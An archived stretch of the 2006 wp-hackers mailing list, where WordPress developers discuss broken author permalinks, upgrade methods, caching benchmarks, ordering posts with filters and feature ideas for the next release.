> sane.
> 

This looks sane.

I have created all my users with firefox and one did work however.

Looking at the query for my admin user that didn't work the . in the
username is being stripped out so:

http://trunk.wp.sandbox.ftwr.co.uk/author/peter.westwood/

Causes the following query:

SELECT ID FROM trunk_users WHERE user_nicename='peterwestwood';

Maybe we need to ban the . or fix the code stripping it?

westi
- --
Peter Westwood
http://blog.ftwr.co.uk
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.2 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org

iD8DBQFD4TgHVPRdzag0AcURApc7AJ44cp4ad2CGFkCF3kE17p30HdsMLwCfbKLS
iSrD/iPvzDxCEalIVJbdl3Y=
=kMA5
-----END PGP SIGNATURE-----

From newsletter at scytheman.net  Wed Feb  1 22:45:15 2006
From: newsletter at scytheman.net (Sebastian Herp)
Date: Wed Feb  1 22:46:43 2006
Subject: [wp-hackers] Simplified Upgrade Process
In-Reply-To: <7BE43628-6AD6-4824-98E3-A4C879B2FB4D@txfx.net>
References: <E7340445E0595A418B2F8DE0AE480E200970FDC7@ucmail6.ad.uc.edu>	<43E0F2BA.9040907@midnightcircus.com>	<43E0F4A9.80006@tamba2.org.uk>	<43E0F5A7.1050709@midnightcircus.com>	<9b1b9dab0602011022h11a27525h9be4067073345ab0@mail.gmail.com>	<43E0FD12.7000707@skippy.net>	<8e1656660602011053p217d4dcax48766a44a62c7722@mail.gmail.com>
	<7BE43628-6AD6-4824-98E3-A4C879B2FB4D@txfx.net>
Message-ID: <43E139FB.60101@scytheman.net>

Mark Jaquith wrote:
> As for my method of upgrade... I have WordPress in /wordpress/ I load 
> up the new version of WordPress in /wordpress-upgrade/, then I just 
> open up a text editor and write a bunch of "rm" and "mv" commands, 
> excluding /index.php, /wp-config.php, and /wp-content/, and then 
> execute it.
>
> That leaves a lot less downtime than you would get if you deleted then 
> FTP'd the stuff up there.
>
Hmm ... I am using Wordpress since version 1.0 and never had a problem 
with just untargzipping the new release/nightly directly over my current 
installation. Maybe we should just find the circumstances this will fail 
and just fix that or detect it in upgrade.php. Don't make the process 
more painful for the rest of us.
Setting permissions right, and letting an upgrade-script do the 
downloading, unzipping, etc would be nice, but then I am out of the loop 
and have no control over the upgrade (maybe the upgrade thing is broken 
an wildly deletes files on my server ... I don't want that to happen). 
The current way is easy enough. ssh user@host, wget new-archive.tar.gz, 
tar -xzvf new-archive.tar.gz, open browser and call upgrade.php ... easy 
enough :-)
From carthik at gmail.com  Wed Feb  1 22:52:41 2006
From: carthik at gmail.com (Carthik Sharma)
Date: Wed Feb  1 22:53:58 2006
Subject: [wp-hackers] Simplified Upgrade Process
In-Reply-To: <E7340445E0595A418B2F8DE0AE480E2009710142@ucmail6.ad.uc.edu>
References: <E7340445E0595A418B2F8DE0AE480E2009710142@ucmail6.ad.uc.edu>
Message-ID: <80f75db0602011452l16b311e2r3fa3edc2b5b15988@mail.gmail.com>

On 2/1/06, Vogel, Andrew (vogelap) <VOGELAP@ucmail.uc.edu> wrote:
> I got it from http://codex.wordpress.org/Upgrading_WordPress, though
> http://codex.wordpress.org/User:Carthik/Five_Step_Upgrade tells me just
> to overwrite.
>
> I'm comfortable doing it either way, however, I think that instructing
> Joe User to delete and upload (instead of overwriting) is cumbersome,
> inelegant, and prone to mistakes.

Having thought about upgrade woes, at least for some Unix/Linux users,
the path of least resistance seems to be a tool (admin page?)  which:

1) Asks the user to upload the wp.tar.gz file containing the source
for the next version.
2) Compares the core files with the right tag in SVN to identify files
that have changed
3) Offers the files that differ from the unaltered core for download,
either individually, or as a gzipped archive.
4) Untars the new .tar.gz over the existing
5) Asks user to check and restore any of the user-modified files

For this to work, of course, the "upgrade page" should be up even if
the rest of the world is broken, which will take some imaginitive
smithing.

Advantages:
The user need only visit the upgrade page and follow through with the
steps required

Cons:
Not all hosts might have diff/tar installed (maybe bundle the
essential functions with wp then?)

Forgive me if I sound like I am speaking when I am drunk :)

Carthik.
From stefan at hartweg.net  Wed Feb  1 22:56:13 2006
From: stefan at hartweg.net (Stefan Hartweg)
Date: Wed Feb  1 22:57:35 2006
Subject: [wp-hackers] relocated Wordpress - path issue
Message-ID: <200602012256.k11MuEEj011746@post.webmailer.de>

I realize that this is probably a bit off topic, but I have been trying to
find an answer in the support forums for days without success.

I decided to have a local copy of my Wordpress blog on my XP machine to do
all the development there instead of on the live site (live site is linux).
I followed the Moving Wordpress guide at
http://codex.wordpress.org/Moving_WordPress.

Database connection is working however I'm now getting the following error
when trying to view the site/admin interface:
Warning:
main(C:\webserver\htdocs\digitalcamera\wp-includes/functions-compat.php):
failed to open stream: No such file or directory in
C:\webserver\htdocs\digitalcamera\wp-includes\functions.php on line 3

I've changed all the paths from http://www.previousdomain.com to
http://localhost in the sql database file before importing it.
Also, I changed the fileupload real path to
c:/webserver/htdocs/digitalcamera/wp-content

Any idea why it's giving me this error? The path seems correct, apart from
the forwardslash just in front of functions-compat.php.

thanks

Steve 


From ryan at boren.nu  Wed Feb  1 23:03:44 2006
From: ryan at boren.nu (Ryan Boren)
Date: Wed Feb  1 23:05:09 2006
Subject: [wp-hackers] Simplified Upgrade Process
In-Reply-To: <80f75db0602011452l16b311e2r3fa3edc2b5b15988@mail.gmail.com>
References: <E7340445E0595A418B2F8DE0AE480E2009710142@ucmail6.ad.uc.edu>
	<80f75db0602011452l16b311e2r3fa3edc2b5b15988@mail.gmail.com>
Message-ID: <43E13E50.30209@boren.nu>

Carthik Sharma wrote:
> On 2/1/06, Vogel, Andrew (vogelap) <VOGELAP@ucmail.uc.edu> wrote:
> 
>>I got it from http://codex.wordpress.org/Upgrading_WordPress, though
>>http://codex.wordpress.org/User:Carthik/Five_Step_Upgrade tells me just
>>to overwrite.
>>
>>I'm comfortable doing it either way, however, I think that instructing
>>Joe User to delete and upload (instead of overwriting) is cumbersome,
>>inelegant, and prone to mistakes.
> 
> 
> Having thought about upgrade woes, at least for some Unix/Linux users,
> the path of least resistance seems to be a tool (admin page?)  which:
> 
> 1) Asks the user to upload the wp.tar.gz file containing the source
> for the next version.
> 2) Compares the core files with the right tag in SVN to identify files
> that have changed
> 3) Offers the files that differ from the unaltered core for download,
> either individually, or as a gzipped archive.
> 4) Untars the new .tar.gz over the existing
> 5) Asks user to check and restore any of the user-modified files
> 
> For this to work, of course, the "upgrade page" should be up even if
> the rest of the world is broken, which will take some imaginitive
> smithing.
> 
> Advantages:
> The user need only visit the upgrade page and follow through with the
> steps required
> 
> Cons:
> Not all hosts might have diff/tar installed (maybe bundle the
> essential functions with wp then?)
> 
> Forgive me if I sound like I am speaking when I am drunk :)

That would be nice if file management on most hosts weren't such pain. 
You have to worry with permissions, safe_mode crack, security concerns, 
and so on.  See what happened when we tried to get the disk cache and 
uploads going.

Ryan

From ryan at boren.nu  Thu Feb  2 00:33:13 2006
From: ryan at boren.nu (Ryan Boren)
Date: Thu Feb  2 00:34:35 2006
Subject: [wp-hackers] Development for 2.next
Message-ID: <43E15349.6060708@boren.nu>

A few development ideas for the next release, including proposed 
implementations.

* Implement the pluggable install functions we discussed earlier.

http://comox.textdrive.com/pipermail/wp-hackers/2005-November/003321.html

* Build in capability to make a page the home/front page.

Add "Make this page the home page" checkbox to the Create/Edit Page UI. 
  Set "front_page" option to the id of the selected page.
In WP_Query::get_posts(), if is_home() and "front_page" is set, set the 
page_id to the "front_page" id and run the query.

* Support page drafts.

Bust "static" out of post_status and into post_type.  Add a "post" 
post_type.   Reserve post_status for actual status (public, private, draft).


What else?

Ryan

From wphackers at jamietalbot.com  Thu Feb  2 01:10:33 2006
From: wphackers at jamietalbot.com (Jamie Talbot)
Date: Thu Feb  2 01:12:02 2006
Subject: [wp-hackers] /author/ is still broken.
In-Reply-To: <ebe43d680602011432i5ff81d9bl@mail.gmail.com>
References: <ebe43d680602011350s393b8d03t@mail.gmail.com>	<43E1329B.9000007@boren.nu>
	<ebe43d680602011432i5ff81d9bl@mail.gmail.com>
Message-ID: <43E15C09.3030200@jamietalbot.com>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

David House wrote:
> If you've been creating users with Firefox this could cause the
> problem. Because user_login is a disabled field on user-edit.php,
> Firefox choses not to send the value of the field when you hit submit.
> This means that user_nicename doesn't get properly filled from the
> login; each user's user_nicename is something like '10' or '4', so the
> correct URL for them ends up being something like /author/10, not what
> you expect.

Instead of "disabled" could you just set readonly="readonly" on the input?

Cheers,

Jamie.

- --
http://jamietalbot.com
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.2.5 (MingW32)
Comment: Using GnuPG with Thunderbird - http://enigmail.mozdev.org

iD8DBQFD4VwIrovxfShShFARAljoAJ9aZypK1Q0JbwUkxZFdHXMD+Lm2sgCglQDT
FAA/Q0yE5o5UHOmqXhObuWc=
=TCzC
-----END PGP SIGNATURE-----
From ckelly5 at gmail.com  Thu Feb  2 01:10:51 2006
From: ckelly5 at gmail.com (Chris Kelly)
Date: Thu Feb  2 01:12:10 2006
Subject: [wp-hackers] Development for 2.next
In-Reply-To: <43E15349.6060708@boren.nu>
References: <43E15349.6060708@boren.nu>
Message-ID: <598298a0602011710y365a7b21n7894133f1e739b1a@mail.gmail.com>

If you're going with a "make this page the home page" solution, what
would be the easiest way to use that in conjunction with a subsection/
Page as the journal?

Perhaps to specify a "make this page the journal page" checkbox as
well? You could add an "journal_page" checkbox, and then make the
wordpress loop look for Is_journal_page

For example, my dream single wordpress install scenario would be the following:

- I want to install Wordpress in my root directory at blah.com.

- I want to have a "static" (non-journal) page (front_page) as my
welcome page in the root directory, where I can list sections, etc.
and have a little welcome splash/ blurb about myself.

- I want to have Pages off of the main welcome page:
blah.com/projects, blah.com/resume, blah.com/aboutme, etc.

- I want to have my journal off of the main welcome page as well:
blah.com/journal, where all my archives would then be rooted off of:
blah.com/journal/archives.

a current WP setup would not give me all of the above (without
resorting to some hacking). I'd have pages off the journal if I
installed it to journal (to get the blog in the journal directory) and
would maybe need another wp install to get the main page working
properly (with a page as front page plugin). And this would all be
using the same theme template.

The journal_page option could also be unchecked and you'd be left with
a Pages-only site implementation, that all share a common theme, which
could be cool as well for photo portfolios and the like. The current
wordpress payout could also be recreated by having one of the pages (a
default page called "index"?) be checked as the front_page and
journal_page.



feature request #2: how about a post draft autosave feature akin to
Gmail's draft autosave?



On 2/1/06, Ryan Boren <ryan@boren.nu> wrote:
> A few development ideas for the next release, including proposed
> implementations.
>
> * Implement the pluggable install functions we discussed earlier.
>
> http://comox.textdrive.com/pipermail/wp-hackers/2005-November/003321.html
>
> * Build in capability to make a page the home/front page.
>
> Add "Make this page the home page" checkbox to the Create/Edit Page UI.
>   Set "front_page" option to the id of the selected page.
> In WP_Query::get_posts(), if is_home() and "front_page" is set, set the
> page_id to the "front_page" id and run the query.
>
> * Support page drafts.
>
> Bust "static" out of post_status and into post_type.  Add a "post"
> post_type.   Reserve post_status for actual status (public, private, draft).
>
>
> What else?
>
> Ryan
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
From carthik at gmail.com  Thu Feb  2 01:37:35 2006
From: carthik at gmail.com (Carthik Sharma)
Date: Thu Feb  2 01:38:52 2006
Subject: [wp-hackers] Development for 2.next
In-Reply-To: <598298a0602011710y365a7b21n7894133f1e739b1a@mail.gmail.com>
References: <43E15349.6060708@boren.nu>
	<598298a0602011710y365a7b21n7894133f1e739b1a@mail.gmail.com>
Message-ID: <80f75db0602011737o49a03298geda54b8614791e29@mail.gmail.com>

On 2/1/06, Chris Kelly <ckelly5@gmail.com> wrote:
> If you're going with a "make this page the home page" solution, what
> would be the easiest way to use that in conjunction with a subsection/
> Page as the journal?
>
http://www.ilfilosofo.com/blog/home-page-control is a plugin that does
precisely this - which was previously discussed on this list.
http://sabarish.net is an example of a blog driven by the plugin.
<snip>

> On 2/1/06, Ryan Boren <ryan@boren.nu> wrote:
> > A few development ideas for the next release, including proposed
> > implementations.
> > * Build in capability to make a page the home/front page.
> >
> > Add "Make this page the home page" checkbox to the Create/Edit Page UI.
> >   Set "front_page" option to the id of the selected page.
> > In WP_Query::get_posts(), if is_home() and "front_page" is set, set the
> > page_id to the "front_page" id and run the query.
This when coupled with a "slug" for the main "blog" page  would be awesome.

Carthik.
--
Ph.D. Candidate
University of Central Florida
Homepage: http://carthik.net
From ckelly5 at gmail.com  Thu Feb  2 02:20:11 2006
From: ckelly5 at gmail.com (Chris Kelly)
Date: Thu Feb  2 02:21:32 2006
Subject: [wp-hackers] Development for 2.next
In-Reply-To: <80f75db0602011737o49a03298geda54b8614791e29@mail.gmail.com>
References: <43E15349.6060708@boren.nu>
	<598298a0602011710y365a7b21n7894133f1e739b1a@mail.gmail.com>
	<80f75db0602011737o49a03298geda54b8614791e29@mail.gmail.com>
Message-ID: <598298a0602011820g4bd302a1t31380e69e8a71f3b@mail.gmail.com>

Ahh, haven't seen that plugin before. Pretty new to the list :)

thanks for the heads up!

-C

On 2/1/06, Carthik Sharma <carthik@gmail.com> wrote:
> On 2/1/06, Chris Kelly <ckelly5@gmail.com> wrote:
> > If you're going with a "make this page the home page" solution, what
> > would be the easiest way to use that in conjunction with a subsection/
> > Page as the journal?
> >
> http://www.ilfilosofo.com/blog/home-page-control is a plugin that does
> precisely this - which was previously discussed on this list.
> http://sabarish.net is an example of a blog driven by the plugin.
> <snip>
>
> > On 2/1/06, Ryan Boren <ryan@boren.nu> wrote:
> > > A few development ideas for the next release, including proposed
> > > implementations.
> > > * Build in capability to make a page the home/front page.
> > >
> > > Add "Make this page the home page" checkbox to the Create/Edit Page UI.
> > >   Set "front_page" option to the id of the selected page.
> > > In WP_Query::get_posts(), if is_home() and "front_page" is set, set the
> > > page_id to the "front_page" id and run the query.
> This when coupled with a "slug" for the main "blog" page  would be awesome.
>
> Carthik.
> --
> Ph.D. Candidate
> University of Central Florida
> Homepage: http://carthik.net
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
>
>
From ringmaster at midnightcircus.com  Thu Feb  2 02:37:04 2006
From: ringmaster at midnightcircus.com (Owen Winkler)
Date: Thu Feb  2 02:38:34 2006
Subject: [wp-hackers] Development for 2.next
In-Reply-To: <43E15349.6060708@boren.nu>
References: <43E15349.6060708@boren.nu>
Message-ID: <43E17050.1010708@midnightcircus.com>

Ryan Boren wrote:
> What else?

* Rework the main post query to use post_status "future" or some other 
similar technique.
* Built-in pseudo-cron with matching hooks to go along with future posting.
* Atom 1.0/Feed Engine.
* Implement Atom *commenting/posting* API.
* Rework comments to use API (with new filtering hooks!) instead of 
direct queries.
* Rework categories to use API (with new filtering hooks!) instead of 
direct queries.
* Include vital notices ("Upgrade available!", "Security release 
available!"), customize the feeds, and add more plugin hooks to the 
Dashboard.
* Rewrite the rewrite class to be understood by mortals, and perhaps to 
better handle (or allow) custom URL structures directly from the admin 
panel.
* Better/new default theme - something more easily customized by casual 
HTML coders.
* More/better integrated help - direct links on every page to relevant 
Codex documentation.
* Improved post/page search functionality.
* Extend themes to the login page, add login hardening (3 strikes, etc.)
* OpenID.
* SQLite.
* Produce fudge swirl ice cream.

Gimme a few minutes to think about it, and I'll come up with more.

Owen


From carthik at gmail.com  Thu Feb  2 02:44:43 2006
From: carthik at gmail.com (Carthik Sharma)
Date: Thu Feb  2 02:46:00 2006
Subject: [wp-hackers] Development for 2.next
In-Reply-To: <43E15349.6060708@boren.nu>
References: <43E15349.6060708@boren.nu>
Message-ID: <80f75db0602011844y5a680cc1s8e69946bcdc8ec17@mail.gmail.com>

On 2/1/06, Ryan Boren <ryan@boren.nu> wrote:
> A few development ideas for the next release, including proposed
> implementations.
> What else?

A review of the milestone tagets on
http://codex.wordpress.org/Version_1.6

might be beneficial.

Carthik.

> Ryan
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>


--
Ph.D. Candidate
University of Central Florida
Homepage: http://carthik.net
From sam at rephrase.net  Thu Feb  2 02:49:46 2006
From: sam at rephrase.net (Sam Angove)
Date: Thu Feb  2 02:51:03 2006
Subject: [wp-hackers] Development for 2.next
In-Reply-To: <43E17050.1010708@midnightcircus.com>
References: <43E15349.6060708@boren.nu> <43E17050.1010708@midnightcircus.com>
Message-ID: <aa74b1910602011849o1606115av2b9c1cd876ab3e8e@mail.gmail.com>

On 2/2/06, Owen Winkler <ringmaster@midnightcircus.com> wrote:
>
> * Rework comments to use API (with new filtering hooks!) instead of
> direct queries.

+ comment meta [1]

[1]: http://comox.textdrive.com/pipermail/wp-hackers/2006-January/004044.html


* no more serialized arrays in usermeta [2]

[2]: http://comox.textdrive.com/pipermail/wp-hackers/2005-December/003630.html

(Incidentally, it might also be nice to move the prefix to its own
column, or replace with the global blog_id -- it's annoyingly hard to
(e.g.) get a list of blogs that a user has access to.)
From dto at dev.java.net  Thu Feb  2 06:01:55 2006
From: dto at dev.java.net (Dan Li)
Date: Thu Feb  2 06:03:14 2006
Subject: [wp-hackers] /author/ is still broken.
In-Reply-To: <43E13807.5030202@ftwr.co.uk>
References: <ebe43d680602011350s393b8d03t@mail.gmail.com>
	<43E1329B.9000007@boren.nu>
	<ebe43d680602011432i5ff81d9bl@mail.gmail.com>
	<43E13807.5030202@ftwr.co.uk>
Message-ID: <63900d140602012201l2af11bdev88d02ce4a07a6f5e@mail.gmail.com>

> Looking at the query for my admin user that didn't work the . in the
> username is being stripped out so:
>
> http://trunk.wp.sandbox.ftwr.co.uk/author/peter.westwood/
>
> Causes the following query:
>
> SELECT ID FROM trunk_users WHERE user_nicename='peterwestwood';
>
> Maybe we need to ban the . or fix the code stripping it?
>
> westi
> - --
> Peter Westwood
> http://blog.ftwr.co.uk

Does the user nickname go through sanitize_title? If it does, then it
suffers from http://trac.wordpress.org/ticket/1972

Regards,
  - Dan Li
From chrome at stupendous.net  Thu Feb  2 06:07:36 2006
From: chrome at stupendous.net (Nathan Ollerenshaw)
Date: Thu Feb  2 06:09:12 2006
Subject: [wp-hackers] caching doesn't work?
In-Reply-To: <ebe43d680602010816s5f2bc796o@mail.gmail.com>
References: <18A2E0EE-5EC9-44F0-A3C0-E826652FB79A@stupendous.net>
	<ebe43d680602010816s5f2bc796o@mail.gmail.com>
Message-ID: <39DFEEC8-2700-4C6E-9E15-E53862F1CFB9@stupendous.net>

On Feb 2, 2006, at 1:16 AM, David House wrote:

> You need to define('DISABLE_CACHE', true) to turn it off.

Hi David,

Using ab with DISABLE_CACHE set to false:

Requests per second:    3.47 [#/sec] (mean)
Time per request:       288.096 [ms] (mean)

With DISABLE_CACHE set to true:

Requests per second:    3.67 [#/sec] (mean)
Time per request:       272.454 [ms] (mean)

Its about the same. With the wp-cache plugin, I used to get up to 100  
requests/sec out of WP 1.5, and about 3.5/sec without the wp-cache  
plugin - which is very similar to the numbers I'm getting out of WP  
2.0.1, which suggests to me that even though objects are getting  
written to disk, it's always going to the DB for every request.

It could be a combination of my plugins, but disabling everything and  
dropping back to standard 2.0.1 doesn't seem to have an effect.

I'll have a dig and see if I can find something.

Can someone else do some ab's against 2.0.1 and compare it with 1.5  
running wp-cache? I'd like to know if I'm the only one seeing a  
difference here.

Cheers,

Nathan.
From chrome at stupendous.net  Thu Feb  2 06:35:54 2006
From: chrome at stupendous.net (Nathan Ollerenshaw)
Date: Thu Feb  2 06:37:11 2006
Subject: [wp-hackers] caching doesn't work?
In-Reply-To: <39DFEEC8-2700-4C6E-9E15-E53862F1CFB9@stupendous.net>
References: <18A2E0EE-5EC9-44F0-A3C0-E826652FB79A@stupendous.net>
	<ebe43d680602010816s5f2bc796o@mail.gmail.com>
	<39DFEEC8-2700-4C6E-9E15-E53862F1CFB9@stupendous.net>
Message-ID: <0390CF57-3706-49F3-A945-CE3BF15CE647@stupendous.net>

On Feb 2, 2006, at 3:07 PM, Nathan Ollerenshaw wrote:

> Can someone else do some ab's against 2.0.1 and compare it with 1.5  
> running wp-cache? I'd like to know if I'm the only one seeing a  
> difference here.

Actually, wp-cache seems to work under 2.0.1. I had no idea.

Requests per second:    3.42 [#/sec] (mean)
Time per request:       292.455 [ms] (mean)

vs

Requests per second:    170.70 [#/sec] (mean)
Time per request:       5.858 [ms] (mean)

I thought WP_Object_Cache obviates the need for other caching  
systems ... but it doesn't seem to make a difference performance-wise  
whether it is on or off, though looking at what stats() gives you, it  
seems to be 'working'.

Aaaany way, mucked with this too much... just hoping this is useful  
for someone.

Cheers,

Nathan.
From ryan at boren.nu  Thu Feb  2 06:47:05 2006
From: ryan at boren.nu (Ryan Boren)
Date: Thu Feb  2 06:48:26 2006
Subject: [wp-hackers] caching doesn't work?
In-Reply-To: <0390CF57-3706-49F3-A945-CE3BF15CE647@stupendous.net>
References: <18A2E0EE-5EC9-44F0-A3C0-E826652FB79A@stupendous.net>	<ebe43d680602010816s5f2bc796o@mail.gmail.com>	<39DFEEC8-2700-4C6E-9E15-E53862F1CFB9@stupendous.net>
	<0390CF57-3706-49F3-A945-CE3BF15CE647@stupendous.net>
Message-ID: <43E1AAE9.4020203@boren.nu>

Nathan Ollerenshaw wrote:
> On Feb 2, 2006, at 3:07 PM, Nathan Ollerenshaw wrote:
> 
>> Can someone else do some ab's against 2.0.1 and compare it with 1.5  
>> running wp-cache? I'd like to know if I'm the only one seeing a  
>> difference here.
> 
> 
> Actually, wp-cache seems to work under 2.0.1. I had no idea.
> 
> Requests per second:    3.42 [#/sec] (mean)
> Time per request:       292.455 [ms] (mean)
> 
> vs
> 
> Requests per second:    170.70 [#/sec] (mean)
> Time per request:       5.858 [ms] (mean)
> 
> I thought WP_Object_Cache obviates the need for other caching  systems 
> ... but it doesn't seem to make a difference performance-wise  whether 
> it is on or off, though looking at what stats() gives you, it  seems to 
> be 'working'.
> 
> Aaaany way, mucked with this too much... just hoping this is useful  for 
> someone.

The object cache can't compete with a full static caching system like 
wp-cache, nor is it meant to.  In my ab benchmarks, the persistent 
object cache offered a marginal performance improvement over running 
without persistent caching. The benchmarking was done on a couple of 
shared hosting setups.  On my personal servers, I saw slightly better 
performance, depending on the amount of disk caching.  The real 
advantage of the cache is that it is pluggable.  Thus you can use APC or 
memcached backends.  As for the default backend, on some hosts it simply 
doesn't buy you much.  It all depends.

Ryan
From dmhouse at gmail.com  Thu Feb  2 09:59:35 2006
From: dmhouse at gmail.com (David House)
Date: Thu Feb  2 10:00:54 2006
Subject: [wp-hackers] caching doesn't work?
In-Reply-To: <0390CF57-3706-49F3-A945-CE3BF15CE647@stupendous.net>
References: <18A2E0EE-5EC9-44F0-A3C0-E826652FB79A@stupendous.net>
	<ebe43d680602010816s5f2bc796o@mail.gmail.com>
	<39DFEEC8-2700-4C6E-9E15-E53862F1CFB9@stupendous.net>
	<0390CF57-3706-49F3-A945-CE3BF15CE647@stupendous.net>
Message-ID: <ebe43d680602020159m132edb29k@mail.gmail.com>

On 02/02/06, Nathan Ollerenshaw <chrome@stupendous.net> wrote:
> I thought WP_Object_Cache obviates the need for other caching
> systems ... but it doesn't seem to make a difference performance-wise
> whether it is on or off, though looking at what stats() gives you, it
> seems to be 'working'.

Try sticking $wp_object_cache->stats() somewhere in your theme to see
how many hot/cold hits you're getting. (a hot hit is one where the
object was already cached in memory, a cold one is where it has to be
loaded from the file system, a miss is where it can't be found even
there).

--
-David House, dmhouse@gmail.com, http://xmouse.ithium.net
From dmhouse at gmail.com  Thu Feb  2 10:02:46 2006
From: dmhouse at gmail.com (David House)
Date: Thu Feb  2 10:04:07 2006
Subject: [wp-hackers] Development for 2.next
In-Reply-To: <43E15349.6060708@boren.nu>
References: <43E15349.6060708@boren.nu>
Message-ID: <ebe43d680602020202t227cf6e4y@mail.gmail.com>

On 02/02/06, Ryan Boren <ryan@boren.nu> wrote:
> What else?

Revamp the Write Post screen.

--
-David House, dmhouse@gmail.com, http://xmouse.ithium.net
From steagl at people.it  Thu Feb  2 10:08:09 2006
From: steagl at people.it (Stefano)
Date: Thu Feb  2 10:09:43 2006
Subject: [wp-hackers] Development for 2.next
References: <43E15349.6060708@boren.nu>
Message-ID: <v0m3u1h8s4vnuour2su7gap72jijm9uk3e@4ax.com>

Il Wed, 01 Feb 2006 16:33:13 -0800, Ryan Boren <ryan@boren.nu> scrive:

>A few development ideas for the next release, including proposed 
>implementations.
...
>What else?

- Improving Rich Editor lallowing more option be available like text
justify coloured text etc.

- Allow internationalization of RIche Editor in tooltips etc.

- GIve in the editors image insertion inside a predefined div classes
(imgright, imgleft, imagecenter) that can be defined by theme to give
framed or dropshadowed picture alligned as user like, with or without
float.

- Improving image uploader, allowing setting thumbails dimension,
clerify better the image menu, allowing few peration on uploaded
image, like resize and rotation.

- Rewiew for IM contact in user profile, actually are shown only few
of the ones abvailable, we have to show all or noone.

If you think could be usuefull i can take a little survey for italian
users and suggest here the 10 top request.

-- 

Stefano Aglietti - StallonIt on IRCnet - ICQ#: 2078431
Email: steve@40annibuttati.it steagl@people.it
Sites: http://www.40annibuttati.it
       http://www.wordpress-it.it
From danny.ayers at gmail.com  Thu Feb  2 14:13:14 2006
From: danny.ayers at gmail.com (Danny Ayers)
Date: Thu Feb  2 14:14:34 2006
Subject: [wp-hackers] Order by +/- ?
Message-ID: <1f2ed5cd0602020613n5a828a45x758427b6e214127f@mail.gmail.com>

Apologies, this is a bit of newbie-user question, but it came to mind
while musing on feed provision issues, so hopefully not too off-topic
for dev.

Are there currently any method/arguments in place to flip the
chronological (or other) order of items etc returned? i.e. something
that wraps ...ORDER BY ASC/DESC

Cheers,
Danny.

--

http://dannyayers.com
From skeltoac at gmail.com  Thu Feb  2 14:31:56 2006
From: skeltoac at gmail.com (Andy Skelton)
Date: Thu Feb  2 14:33:15 2006
Subject: [wp-hackers] Order by +/- ?
In-Reply-To: <1f2ed5cd0602020613n5a828a45x758427b6e214127f@mail.gmail.com>
References: <1f2ed5cd0602020613n5a828a45x758427b6e214127f@mail.gmail.com>
Message-ID: <e6ec604d0602020631v529e279ey82966cbd4bec578@mail.gmail.com>

On 2/2/06, Danny Ayers <danny.ayers@gmail.com> wrote:
> Apologies, this is a bit of newbie-user question, but it came to mind
> while musing on feed provision issues, so hopefully not too off-topic
> for dev.

Nah :)

> Are there currently any method/arguments in place to flip the
> chronological (or other) order of items etc returned? i.e. something
> that wraps ...ORDER BY ASC/DESC

On line 651 of classes.php:
$orderby = apply_filters('posts_orderby', $orderby);
You can use that filter to modify the query.

On line 689 of classes.php:
$this->posts = apply_filters('the_posts', $this->posts);
You can use this to sort the posts any way you like.

Cheers,
Andy
From davebytes at comcast.net  Thu Feb  2 14:39:18 2006
From: davebytes at comcast.net (David Chait)
Date: Thu Feb  2 14:40:36 2006
Subject: [wp-hackers] caching doesn't work?
References: <18A2E0EE-5EC9-44F0-A3C0-E826652FB79A@stupendous.net>	<ebe43d680602010816s5f2bc796o@mail.gmail.com>	<39DFEEC8-2700-4C6E-9E15-E53862F1CFB9@stupendous.net><0390CF57-3706-49F3-A945-CE3BF15CE647@stupendous.net>
	<43E1AAE9.4020203@boren.nu>
Message-ID: <001701c62806$72e0fca0$6e01a8c0@sixfour>

Color me confused.  I'd think the majority of folks would be on shared 
hosting, in which case 'marginal improvement' would seem rather useless.  So 
was this really targeted at some point being implemented with 'a real 
backend' for large websites with dedi servers?  Don't get me wrong, with the 
growth of WP for really big sites, it's a needed thing -- but I'd think the 
page-caching stuff, with an order of magnitude (or two, or three if you use 
lighttpd or equiv...) improvement, would be better worth 'core dev cycles'.

I should note that I've had my own home-grown query caching in place for 
maybe a year, given that my old host had MySQL servers separate from the 
apache boxes, and I figured going to disk is (sometimes) faster than going 
across the network to another box which might not be caching well and 
hitting a db table which may or may not be fully resident (or the box might 
be under heavy loads...).  I saw some decent pageload speed increases due to 
elimination of common queries -- but I haven't yet compared my approach to 
the new 2.0 object cache (might be redundant, might be I catch extra stuff 
that I found more the culprits...).

In any case, might I suggest this conversation could blend into the 2.next 
conversation, and that wp-cache (which started as Staticize...) be 
considered for direct inclusion in the distro (given the impact it makes) 
and direct maintenance as a core element, and that the two different caching 
approaches be detailed well enough in docs/codex that people aren't confused 
why their performance drops when they upgrade to 2.0 and don't put wp-cache 
back into play? ;) ;) ;)

-d

----- Original Message ----- 
From: "Ryan Boren" <ryan@boren.nu>
To: <wp-hackers@lists.automattic.com>
Sent: Thursday, February 02, 2006 1:47 AM
Subject: Re: [wp-hackers] caching doesn't work?


| Nathan Ollerenshaw wrote:
| > I thought WP_Object_Cache obviates the need for other caching  systems
| > ... but it doesn't seem to make a difference performance-wise  whether
| > it is on or off, though looking at what stats() gives you, it  seems to
| > be 'working'.
| The object cache can't compete with a full static caching system like
| wp-cache, nor is it meant to.  In my ab benchmarks, the persistent
| object cache offered a marginal performance improvement over running
| without persistent caching. The benchmarking was done on a couple of
| shared hosting setups.  On my personal servers, I saw slightly better
| performance, depending on the amount of disk caching.  The real
| advantage of the cache is that it is pluggable.  Thus you can use APC or
| memcached backends.  As for the default backend, on some hosts it simply
| doesn't buy you much.  It all depends.| 

From sam at rephrase.net  Thu Feb  2 14:43:47 2006
From: sam at rephrase.net (Sam Angove)
Date: Thu Feb  2 14:45:10 2006
Subject: [wp-hackers] Order by +/- ?
In-Reply-To: <e6ec604d0602020631v529e279ey82966cbd4bec578@mail.gmail.com>
References: <1f2ed5cd0602020613n5a828a45x758427b6e214127f@mail.gmail.com>
	<e6ec604d0602020631v529e279ey82966cbd4bec578@mail.gmail.com>
Message-ID: <aa74b1910602020643q2ff2aeadi6c6b4436a2dcd136@mail.gmail.com>

> > Are there currently any method/arguments in place to flip the
> > chronological (or other) order of items etc returned? i.e. something
> > that wraps ...ORDER BY ASC/DESC
>
